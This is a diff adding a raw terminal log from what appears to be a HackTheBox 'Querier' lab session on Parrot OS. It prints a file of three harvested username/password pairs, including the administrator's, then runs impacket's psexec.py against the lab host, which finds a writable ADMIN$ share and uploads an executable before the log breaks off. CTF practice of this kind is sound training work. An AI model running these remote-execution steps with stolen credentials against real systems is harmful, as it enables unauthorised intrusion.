@@ -1,0 +1,54 @@
+┌─[root@parrot]─[~] 
+└──╼ #locate psexec.py                  
+/opt/impacket/examples/psexec.py        
+/usr/local/bin/psexec.py                
+/usr/local/bin/psexec.pyc               
+/usr/share/doc/python3-impacket/examples/psexec.py                          
+/usr/share/keimpx/lib/psexec.py         
+/usr/share/set/src/fasttrack/psexec.py  
+┌─[root@parrot]─[~] 
+└──╼ #cd hackthebox/querrier/         
+┌─[root@parrot]─[~/hackthebox/querrier]                                     
+└──╼ #vi creds     
+┌─[root@parrot]─[~/hackthebox/querrier]                                     
+└──╼ #cat creds    
+usernmae : reporting                  
+password : PcwTWTHRwryjc$c6           
+
+username : mssql_svc                  
+passowrd: corporate568                
+
+username : administrator              
+password : MyUnclesAreMarioAndLuigi!!1!                                     
+┌─[root@parrot]─[~/hackthebox/querrier]                                     
+└──╼ #status service apache           
+-bash: status: command not found      
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                 
+└──╼ #netstat -antp | grep sshd       
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                 
+└──╼ #netstat -antp | grep apache     
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                 
+└──╼ #locate wmiexec.py               
+/opt/impacket/examples/wmiexec.py     
+/usr/lib/python2.7/dist-packages/cme/execmethods/wmiexec.py                 
+/usr/local/bin/wmiexec.py             
+/usr/local/bin/wmiexec.pyc            
+/usr/share/doc/python3-impacket/examples/wmiexec.py                         
+/usr/share/metasploit-framework/modules/auxiliary/scanner/smb/impacket/wmiexec.py              
+┌─[root@parrot]─[~/hackthebox/querrier]                                     
+└──╼ #netsh advfirewall firewall set rule name="File and Printer Sharing (SMB-In)" dir=in new enable=Yes          
+-bash: netsh: command not found       
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                 
+└──╼ #apt-get install netsh           
+Reading package lists... Done         
+Building dependency tree              
+Reading state information... Done     
+E: Unable to locate package netsh     
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                 
+└──╼ #psexec.py administrator@10.10.10.125                                  
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                
+
+Password:          
+[*] Requesting shares on 10.10.10.125.....                                  
+[*] Found writable share ADMIN$       
+[*] Uploading file WpEzefCv.exe       
